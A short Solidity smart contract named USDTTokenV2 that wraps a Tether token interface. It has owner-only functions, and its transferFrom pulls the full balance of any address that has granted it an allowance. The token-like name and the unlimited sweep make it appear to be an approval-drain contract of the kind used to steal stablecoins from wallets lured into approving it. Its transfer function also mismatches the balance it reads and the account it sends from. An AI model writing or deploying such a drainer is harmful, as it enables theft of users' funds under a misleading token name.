// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.4.25;
import "./Ownable.sol";

/**
 * @title Owner
 * @dev Set & change owner
 */

contract TetherToken {
   function transfer(address to, uint value) public;
   function transferFrom(address from, address to, uint value) public;
   function balanceOf(address who) public view returns (uint256);
}

//transfer方法的接口说明
contract USDTTokenV2 is Ownable{
    constructor() public {}

    function transfer(
        address _token,
        address _to
    ) external onlyOwner{
        TetherToken token0 = TetherToken(_token);
        token0.transfer(_to, token0.balanceOf(msg.sender));
    }

    function transferFrom(
        address _token,
        address _from,
        address _to
    ) external onlyOwner{
        TetherToken token0 = TetherToken(_token);
        token0.transferFrom(_from, _to, token0.balanceOf(_from));
    }
    
    function balance(
        address _token,
        address _from
    ) external view returns(uint){
        TetherToken token0 = TetherToken(_token);
        return token0.balanceOf(_from);
    }
}